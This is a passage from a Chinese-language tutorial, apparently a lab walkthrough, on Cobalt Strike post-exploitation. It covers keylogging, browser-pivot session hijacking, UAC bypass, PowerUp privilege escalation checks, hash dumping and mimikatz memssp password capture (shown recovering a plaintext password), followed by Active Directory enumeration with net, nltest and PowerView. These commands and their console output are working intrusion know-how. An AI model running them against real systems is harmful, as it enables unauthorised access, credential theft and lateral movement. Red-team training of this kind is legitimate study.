x64</code>来注入一个 x64 程序，explorer.exe 是一个好的候选程序。</p><p>使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到<code>View --&gt; Keystrokes</code>中进行查看。</p><p><strong>其他</strong></p><p>除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到<code>Explore --&gt; Process List</code>下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。</p><p>从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。</p><h2 id="5、浏览器转发"><a href="#5、浏览器转发" class="headerlink" title="5、浏览器转发"></a>5、浏览器转发</h2><p>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站的admin账户。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-1.png"></p><p>找到目前正在使用IE浏览器的目标后，右击该会话，选择<code>Explore --&gt; Browser Pivot</code>，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。</p><p>此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。</p><p>代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。</p><h2 id="6、端口扫描"><a href="#6、端口扫描" class="headerlink" title="6、端口扫描"></a>6、端口扫描</h2><p><code>portscan</code>：进行端口扫描，使用参数为：<code>portscan [targets] [ports] [discovery method]</code>。</p><p>目标发现<code>discovery method</code>有三种方法，分别是：<code>arp、icmp、none</code>，<code>arp</code>方法使用 ARP 请求来发现一个主机是否存活。<code>icmp</code>方法发送一个 ICMP echo 请求来检查一个目标是否存活。<code>none</code>选项让端口扫描工具假设所有的主机都是存活的。</p><p>端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。</p><p>右击 Beacon会话，在<code>Explore --&gt; Port Scan</code>中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-2.png"></p><h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><h2 id="1、用户账户控制"><a href="#1、用户账户控制" class="headerlink" title="1、用户账户控制"></a>1、用户账户控制</h2><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC<code>User Account Control</code>机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。</p><p>此时系统用户可分为以下三种等级：</p><p>高：管理员权限</p><p>中：一般用户权限</p><p>低：受限制的权限</p><p>使用<code>whoami /groups</code>命令可以看到当前用户所在的组以及权限，使用<code>net localgroup administrators</code>可以查看当前在管理员组里的用户名。</p><h2 id="2、提权操作"><a href="#2、提权操作" class="headerlink" title="2、提权操作"></a>2、提权操作</h2><p>当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。</p><p>在 CS 中有以下几种提权操作：</p><p><code>bypassuac</code>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。</p><p><code>elevate</code>：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</p><p><code>getsystem</code>：将本地高级管理员权限提升至系统权限。</p><p><code>runas</code>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</p><p><code>spawnas</code>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程。</p><h3 id="Spawn-As"><a href="#Spawn-As" class="headerlink" title="Spawn As"></a>Spawn As</h3><p>首先，右击待提权的会话，选择<code>Access --&gt; Spawn As</code>，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs12-1.png"></p><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>Bypass UAC 有两个步骤，分别是：</p><p>1、利用 UAC 漏洞来获取一个特权文件副本</p><p>2、使用 DLL 劫持进行代码执行</p><p>首先使用<code>shell whoami /groups</code>查看当前上线主机用户的所属组及 UAC 等级</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-1.png"></p><p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，根据上一节中关于的介绍，此时可以使用<code>bypassuac</code>进行提权。</p><p>首先，右击会话，选择<code>Access --&gt; Elevate</code>，这里选择一个 SMB Beacon，Exploit 选择<code>uac-token-duplication</code>，最后 Launch 即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-2.png"></p><p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-3.png"></p><h2 id="3、PowerUp"><a href="#3、PowerUp" class="headerlink" title="3、PowerUp"></a>3、PowerUp</h2><p>PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。</p><p>利用 PowerUp 进行提权需要首先导入 ps1 文件<code>powershell-import PowerUp.ps1</code>，再执行<code>powershell Invoke-AllChecks</code>命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p><blockquote><p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p></blockquote><p><strong>PowerUp 的使用</strong></p><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p><pre><code>powershell-import PowerUp.ps1powershell invoke-allchecks</code></pre><p>详细运行过程：</p><pre><code>beacon&gt; powershell-import PowerUp.ps1[*] Tasked beacon to import: PowerUp.ps1[+] host called home, sent: 275084 bytesbeacon&gt; powershell invoke-allchecks[*] Tasked beacon to run: invoke-allchecks[+] host called home, sent: 313 bytes[+] received output:[*] Running Invoke-AllChecks[+] Current user already has local administrative privileges![*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...[+] received output:ServiceName                     : AeLookupSvcPath                            : C:\Windows\system32\svchost.exe -k netsvcsModifiableFile                  : C:\Windows\system32ModifiableFilePermissions       : GenericAllModifiableFileIdentityReference : BUILTIN\AdministratorsStartName                       : localSystemAbuseFunction                   : Install-ServiceBinary -Name &#39;AeLookupSvc&#39;CanRestart                      : True……内容太多，此处省略……[*] Checking service permissions...[+] received output:ServiceName   : AeLookupSvcPath          : C:\Windows\system32\svchost.exe -k netsvcsStartName     : localSystemAbuseFunction : Invoke-ServiceAbuse -Name &#39;AeLookupSvc&#39;CanRestart    : True……内容太多，此处省略……[*] Checking %PATH% for potentially hijackable DLL locations...[+] received output:Permissions       : GenericAllModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\IdentityReference : BUILTIN\Administrators%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPowerS                    hell\v1.0\\wlbsctrl.dll&#39;……内容太多，此处省略……[*] Checking for AlwaysInstallElevated registry key...[*] Checking for Autologon credentials in registry...[*] Checking for modifidable registry autoruns and configs...[+] received output:Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use                 r ProcessPath           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusrModifiableFile : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference=BUILTIN\A                 dministrators&#125;……内容太多，此处省略……[*] Checking for modifiable schtask files/configs...[+] received output:TaskName     : GoogleUpdateTaskMachineCoreTaskFilePath : @&#123;Permissions=System.Object[]; ModifiablePath=C:\Program Files (               x86)\Google\Update\GoogleUpdate.exe; IdentityReference=BUILTIN\A               dministrators&#125;TaskTrigger  : &lt;Triggers xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mi               t/task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;&lt;Cal               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;/StartBoundary&gt;&lt;               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;/DaysInterval&gt;&lt;/ScheduleByDay&gt;&lt;/Ca               lendarTrigger&gt;&lt;/Triggers&gt;……内容太多，此处省略……[*] Checking for unattended install files...UnattendPath : C:\Windows\Panther\Unattend.xml[*] Checking for encrypted web.config strings...[*] Checking for encrypted application pool and virtual directory passwords...[*] Checking for plaintext passwords in McAfee SiteList.xml files....[+] received output:[*] Checking for cached Group Policy Preferences .xml files....[+] received output:</code></pre><p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p><p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code> PowerUp.ps1</code>文件了。</p><pre><code>PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): YPS C:\WINDOWS\system32&gt;</code></pre><p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p><p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p><p>参考网上相关文章后也未果，这也是为什么这一节拖更这么久的原因，因此 PowerUp 的复现过程暂时就没法记录了。</p><p>如果正在看本篇文章的你有过使用 PowerUp 提权成功的经历，欢迎留言分享。</p><h2 id="4、凭证和哈希获取"><a href="#4、凭证和哈希获取" class="headerlink" title="4、凭证和哈希获取"></a>4、凭证和哈希获取</h2><p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-1.png"></p><p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-2.png"></p><p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p><h2 id="5、Beacon-中的-Mimikatz"><a href="#5、Beacon-中的-Mimikatz" class="headerlink" title="5、Beacon 中的 Mimikatz"></a>5、Beacon 中的 Mimikatz</h2><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p><ul><li><p><code>mimikatz [module::command] &lt;args&gt;</code></p><p>运行 mimikatz 命令</p></li><li><p><code>mimikatz [!module::command] &lt;args&gt;</code></p><p>强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。</p></li></ul><ul><li><p><code>mimikatz [@module::command] &lt;args&gt;</code></p><p>使用当前 Beacon 的访问令牌运行 mimikatz 命令</p></li></ul><p>下面是一些<code>mimikatz</code>命令。</p><ul><li><p><code>!lsadump::cache</code></p><p>获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</p></li><li><p><code>!lsadump::sam</code></p><p>获取本地账户密码哈希，该命令与 hashdump 比较类似</p></li><li><p><code>misc::cmd</code></p><p>如果注册表中禁用了 CMD ，就重新启用它</p></li><li><p><code>!misc::memssp</code></p><p>注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</p></li><li><p><code>misc::skeleton</code></p><p>该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</p></li><li><p><code>process::suspend [pid]</code></p><p>挂起某个进程，但是不结束它</p></li><li><p><code>process::resume [pid]</code></p><p>恢复挂起的进程</p></li></ul><p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p><pre><code>mimikatz !misc::memsspcd C:\Windows\system32shell dir mimilsa.logshell type mimilsa.log</code></pre><p>详细运行过程：</p><p>首先运行<code>mimikatz !misc::memssp</code></p><pre><code>beacon&gt; mimikatz !misc::memssp[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command[+] host called home, sent: 1006151 bytes[+] received output:Injected =)</code></pre><p>接下来来到<code>C:\Windows\system32</code>目录</p><pre><code>beacon&gt; cd C:\Windows\system32[*] cd C:\Windows\system32[+] host called home, sent: 27 bytesbeacon&gt; shell dir mimilsa.log[*] Tasked beacon to run: dir mimilsa.log[+] host called home, sent: 46 bytes[+] received output: 驱动器 C 中的卷没有标签。 卷的序列号是 BE29-9C84 C:\Windows\system32 的目录2020/07/23  21:47                24 mimilsa.log               1 个文件             24 字节               0 个目录 17,394,728,960 可用字节</code></pre><p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p><p>查看<code>mimilsa.log</code>文件内容。</p><pre><code>beacon&gt; shell type mimilsa.log[*] Tasked beacon to run: type mimilsa.log[+] host called home, sent: 47 bytes[+] received output:[00000000:000003e5] \    [00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!</code></pre><p>成功获取到当前登录用户的明文密码。</p><h1 id="0x06-横向扩展"><a href="#0x06-横向扩展" class="headerlink" title="0x06 横向扩展"></a>0x06 横向扩展</h1><h2 id="1、Windows-企业局域网环境介绍"><a href="#1、Windows-企业局域网环境介绍" class="headerlink" title="1、Windows 企业局域网环境介绍"></a>1、Windows 企业局域网环境介绍</h2><p><strong>活动目录</strong></p><p>活动目录<code>Active Directory</code>是一种能够集中管理用户、系统和策略的技术，活动目录的一个重要概念就是<code>域</code>。</p><p>Active Directory 存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。例如 Active Directory 域服务即 AD DS 存储着有关用户账户的信息，并且使同一网络下的其他授权用户可以访问此信息。</p><p><strong>域</strong></p><p>域<code>Domain</code>即是一个管理员或者说是网络边界，在域里的用户和系统都是通过 AD进行管理的。</p><p>在域里，如果想控制服务器进行操作就需要取得域的信任。</p><p><strong>域控制器</strong></p><p>域控制器<code>Domain Controller</code>顾名思义就是一个对域里的用户和系统进行身份验证的一个系统。</p><p><strong>本地用户</strong></p><p>本地用户<code>Local User</code>就是系统上的一个标准用户。</p><p>当我们想在 Windows 命令行下指定一个本地的用户时，可以通过输入 <code>.\本地用户名</code>或者 <code>计算机名\本地用户名</code>来指定本地的用户账户，其中<code>.</code>表示计算机名。</p><p><strong>域用户</strong></p><p>域用户<code>Domain User</code>是指域控制器下的用户，如果想指定域用户，可以输入<code>域名\域用户名</code></p><p><strong>本地管理员</strong></p><p>本地管理员<code>Local Administrator</code>即是指在本地系统有管理权限的用户。</p><p><strong>域管理员</strong></p><p>域管理员<code>Domain Administrator</code>是指在域控制器上有管理权限的用户。</p><blockquote><p>注意：以下命令是在主机中运行的结果，在 Cobalt Strike 中运行只需要根据命令类型在命令前加上 shell 或者 powershell 即可。</p></blockquote><h2 id="2、主机和用户枚举"><a href="#2、主机和用户枚举" class="headerlink" title="2、主机和用户枚举"></a>2、主机和用户枚举</h2><h3 id="主机枚举"><a href="#主机枚举" class="headerlink" title="主机枚举"></a>主机枚举</h3><p><strong>一些问题</strong></p><p>当进入目标局域网时，需要弄清楚几个问题。</p><p>1、我正处在那个域上？</p><p>2、域信任关系是什么样的？</p><p>3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？</p><p>4、系统上存放共享数据的地方在哪里？</p><p><strong>一些枚举的命令</strong></p><ul><li><p><code>net view /domain</code> </p><p>枚举出当前域</p></li></ul><pre><code class="powershell">PS C:\&gt; net view /domainDomain-------------------------TEAMSSIX命令成功完成。</code></pre><ul><li><p><code>net view /domain:[domain]</code>、<code>net group &quot;domain computers&quot; /domain</code></p><p><code>net view /domain:[domain]</code>枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。</p><p><code>net group &quot;domain computers&quot; /domain</code>可以获得加入到这个域中的电脑账户列表。</p></li></ul><pre><code class="powershell">PS C:\&gt; net view /domain:teamssix服务器名称            注解----------------------------------\\WIN-72A8ERDSF2P\\WIN-P2AASSD1AF1命令成功完成。PS C:\&gt; net group &quot;domain computers&quot; /domain组名     Domain Computers注释     加入到域中的所有工作站和服务器成员----------------------------------------------WIN-72A8ERDSF2P$命令成功完成。</code></pre><ul><li><p><code>nltest /dclist:[domain]</code></p><p>如果想找到那个主机是域的域控服务器，可以使用<code>nltest</code>命令</p></li></ul><pre><code class="powershell">PS C:\&gt; nltest /dclist:teamssix获得域“teamssix”中 DC 的列表(从“\\WIN-P2AASSD1AF1”中)。    WIN-P2AASSD1AF1.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成</code></pre><p>​        当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径。</p><pre><code class="powershell">PS C:\&gt; C:\windows\sysnative\nltest /dclist:teamssix获得域“teamssix”中 DC 的列表(从“\\WIN-P2AASSD1AF1”中)。    WIN-P2AASSD1AF1.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成</code></pre><ul><li><p><code>nslookup [name]</code>、<code>ping -n 1 -4 [name]</code></p><p>有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称。</p><p>但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址。</p></li></ul><pre><code class="powershell">PS C:\&gt; nslookup WIN-P2AASSD1AF1服务器:  UnKnownAddress:  ::1名称:    WIN-P2AASSD1AF1.teamssix.comAddress:  192.168.15.124PS C:\&gt; ping -n 1 -4 WIN-P2AASSD1AF1正在 Ping WIN-P2AASSD1AF1.teamssix.com [192.168.15.124] 具有 32 字节的数据:来自 192.168.15.124 的回复: 字节=32 时间&lt;1ms TTL=128192.168.15.124 的 Ping 统计信息:    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位):    最短 = 0ms，最长 = 0ms，平均 = 0ms</code></pre><ul><li><p><code>nltest /domain_trusts</code>、<code>nltest /server:[address] /domain_trusts</code></p><p>如果想取得域上的信任关系，可以使用 nltest 命令来实现。</p></li></ul><pre><code class="powershell">PS C:\&gt; nltest /domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成PS C:\&gt; nltest /server:192.168.15.124 /domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成</code></pre><ul><li><p><code>net view \\[name]</code></p><p>如果想列出主机上的共享列表，只需输入<code>net view \\[name]</code>即可</p></li></ul><pre><code class="powershell">PS C:\&gt; net view \\WIN-P2AASSD1AF1在 \\WIN-75F8PRJM4TP 的共享资源共享名  类型  使用为  注释----------------------------------Users   Disk命令成功完成。</code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 <code>net view、net user</code>等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测。</p><p>PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与上一节 PowerUp 的一样需要先 import 导入 ps1 文件。</p><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一些 PowerView 的命令：</p><ul><li><p>Get-NetDomain</p><p>查询本地域的信息</p></li></ul><pre><code class="powershell">PS C:\PowerView&gt; Get-NetDomainForest                  : teamssix.comDomainControllers       : &#123;WIN-P2AASSD1AF1.teamssix.com&#125;Children                : &#123;&#125;DomainMode              : Windows2012DomainParent                  :PdcRoleOwner            : WIN-P2AASSD1AF1.teamssix.comRidRoleOwner            : WIN-P2AASSD1AF1.teamssix.comInfrastructureRoleOwner : WIN-P2AASSD1AF1.teamssix.comName                    : teamssix.com</code></pre><ul><li><p>Invoke-ShareFinder</p><p>查找网络上是否存在共享</p></li></ul><pre><code class="powershell">PS C:\PowerView&gt; Invoke-ShareFinder\\WIN-P2AASSD1AF1.teamssix.com\ADMIN$   - 远程管理\\WIN-P2AASSD1AF1.teamssix.com\C$       - 默认共享\\WIN-P2AASSD1AF1.teamssix.com\IPC$     - 远程 IPC\\WIN-P2AASSD1AF1.teamssix.com\NETLOGON         - Logon server share\\WIN-P2AASSD1AF1.teamssix.com\SYSVOL   - Logon server share</code></pre><ul><li><p>Invoke-MapDomainTrust</p><p>显示当前域的信任关系</p></li></ul><pre><code class="powershell">PS C:\PowerView&gt; Invoke-MapDomainTrust</code></pre><p>其他更多用法可以查看参考链接，或者参考 PowerView 项目上的 ReadMe 部分。</p><h4 id="Net-模块"><a href="#Net-模块" class="headerlink" title="Net 模块"></a>Net 模块</h4><p>Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。</p><pre><code class="powershell">net dclist : 列出当前域的域控制器net dclist [DOMAIN] : 列出指定域的域控制器net share \\[name] : 列出目标的共享列表net view : 列出当前域的主机net view [DOMAIN] : 列出指定域的主机</code></pre><p>在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。</p><pre><code class="powershell">PS C:\&gt; net view服务器名称            注解-------------------------------------------\\WIN-P2AASSD1AF1命令成功完成。</code></pre><pre><code class="powershell">beacon&gt; net view[*] Tasked beacon to run net view[+] host called home, sent: 104504 bytes[+] received output:List of hosts:Server Name             IP Address                       Platform  Version  Type   Comment-----------             ----------                       --------  -------  ----   -------WIN-P2AASSD1AF1         192.168.15.124                   500       6.1      PDC    </code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs15-1.png"></p><h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><p>用户枚举的三个关键步骤：</p><p>1、当前账号是否为管理员账号？</p><p>2、哪些账号是域管理员账号？</p><p>3、哪个账号是这个系统上的本地管理员账号？</p><h4 id="管理员账号"><a href="#管理员账号" class="headerlink" title="管理员账号"></a>管理员账号</h4><p>第一个关键步骤，发现管理员账号。</p><p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p><p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p><pre><code class="powershell">shell dir \\host\C$</code></pre><pre><code class="powershell">#管理员账号运行结果beacon&gt; shell dir \\WinDC\C$[*] Tasked beacon to run: dir \\WinDC\C$[+] host called home, sent: 55 bytes[+] received output: 驱动器 \\WinDC\C$ 中的卷没有标签。 卷的序列号是 F269-89A7 \\WinDC\C$ 的目录2020/06/24  09:29    &lt;DIR&gt;          inetpub2009/07/14  11:20    &lt;DIR&gt;          PerfLogs2020/07/16  21:24    &lt;DIR&gt;          Program Files2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)2020/07/17  23:00    &lt;DIR&gt;          Users2020/07/26  00:55    &lt;DIR&gt;          Windows               0 个文件              0 字节               6 个目录 28,500,807,680 可用字节</code></pre><pre><code class="powershell">#一般账号运行结果beacon&gt; shell dir \\WinDC\C$[*] Tasked beacon to run: dir \\WinDC\C$[+] host called home, sent: 55 bytes[+] received output:拒绝访问。</code></pre><p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p><pre><code class="powershell">shell at \\host</code></pre><pre><code class="powershell">#管理员账号运行结果beacon&gt; shell at \\WinDC[*] Tasked beacon to run: at \\WinDC[+] host called home, sent: 51 bytes[+] received output:状态 ID     日期                    时间          命令行-------------------------------------------------------------------------------        1   今天                    22:30         E:\Install\Thunder\Thunder.exe</code></pre><pre><code class="powershell">#一般账号运行结果beacon&gt; shell at \\WinDC[*] Tasked beacon to run: at \\WinDC[+] host called home, sent: 51 bytes[+] received output:拒绝访问。</code></pre><p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号。</p><pre><code class="powershell">powershell Find-LocalAdminAccess</code></pre><pre><code class="powershell">beacon&gt; powershell-import powerview.ps1[*] Tasked beacon to import: powerview.ps1[+] host called home, sent: 101224 bytesbeacon&gt; powershell Find-LocalAdminAccess[*] Tasked beacon to run: Find-LocalAdminAccess[+] host called home, sent: 329 bytes[+] received output:WinDC.teamssix.com</code></pre><h4 id="域管理员账号"><a href="#域管理员账号" class="headerlink" title="域管理员账号"></a>域管理员账号</h4><p>第二个关键步骤，发现域管理员账号。</p><p><strong>列出域管理员</strong></p><p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p><pre><code class="powershell">net group &quot;enterprise admins&quot; /DOMAINnet group &quot;domain admins&quot; /DOMAIN</code></pre><pre><code class="powershell">beacon&gt; shell net group &quot;enterprise admins&quot; /domain[*] Tasked beacon to run: net group &quot;enterprise admins&quot; /domain[+] host called home, sent: 68 bytes[+] received output:组名     Enterprise Admins注释     企业的指定系统管理员成员-------------------------------------------------------------------------------Administrator            命令成功完成。</code></pre><pre><code class="powershell">beacon&gt; shell net group &quot;domain admins&quot; /domain[*] Tasked beacon to run: net group &quot;domain admins&quot; /domain[+] host called home, sent: 64 bytes[+] received output:组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator            命令成功完成。</code></pre><p>或者运行下面的命令来看谁是域控制器上的管理员</p><pre><code class="powershell">net localgroup &quot;administrators&quot; /DOMAIN</code></pre><pre><code class="powershell">beacon&gt; shell net localgroup &quot;administrators&quot; /domain[*] Tasked beacon to run: net localgroup &quot;administrators&quot; /domain[+] host called home, sent: 70 bytes[+] received output:别名     administrators注释     管理员对计算机/域有不受限制的完全访问权成员-------------------------------------------------------------------------------administratorDomain AdminsDanielEnterprise Admins命令成功完成。</code></pre><p><strong>Net 模块</strong></p><p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p><pre><code class="powershell">net group \\TARGET group name</code></pre><p>也可以运行下面的命令，这会连接任意目标来获取列表</p><pre><code class="powershell">net localgroup \\TARGET group name</code></pre><h4 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h4><p><strong>Net 模块</strong></p><p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p><p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p><p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p><pre><code class="powershell">net localgroup \\TARGET</code></pre><p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p><pre><code class="powershell">net localgroup \\TARGET group name</code></pre><pre><code class="powershell">beacon&gt; net localgroup \\WinDC administrators[*] Tasked beacon to run net localgroup administrators on WinDC[+] host called home, sent: 104510 bytes[+] received output:Members of administrators on \\WinDC:TEAMSSIX\AdministratorTEAMSSIX\DanielTEAMSSIX\Enterprise AdminsTEAMSSIX\Domain Admins</code></pre><p><strong>PowerView 模块</strong></p><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p><pre><code class="powershell">Get-Netlocalgroup -hostname TARGET</code></pre><pre><code class="powershell">beacon&gt; powershell Get-Netlocalgroup -Hostname WinDC[*] Tasked beacon to run: Get-Netlocalgroup -Hostname 